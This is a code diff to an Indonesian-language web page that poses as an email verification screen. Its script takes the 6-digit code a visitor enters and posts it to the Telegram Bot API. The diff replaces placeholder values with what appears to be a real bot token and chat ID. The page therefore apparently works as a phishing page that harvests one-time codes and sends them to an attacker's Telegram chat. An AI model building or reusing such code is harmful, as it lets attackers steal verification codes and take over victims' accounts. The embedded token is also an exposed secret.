@@ -53,7 +53,7 @@
     <div class="flex items-start bg-yellow-50 rounded-md p-3 mb-5">
       <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-2"></i>
       <p class="text-yellow-700 text-xs leading-tight">
-        Kode verifikasi telah dikirim ke [c************a@email.com].
+        Kode verifikasi telah dikirim ke [*********@email.com].
       </p>
     </div>
   </div>
@@ -88,7 +88,7 @@
       }
     });
 
-    // Countdown timer from 00:59 to 00:00
+    // Countdown timer from 02:59 to 00:00
     let timeLeft = 59;
     const timerInterval = setInterval(() => {
       if (timeLeft <= 0) {
@@ -107,8 +107,8 @@
       const code = codeInput.value.trim();
       if (code.length !== 6) return;
 
-      const botToken = 'YOUR_BOT_TOKEN';
-      const chatId = 'YOUR_CHAT_ID';
+      const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+      const chatId = '7549590022';
       const message = `Kode verifikasi diterima: ${code}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
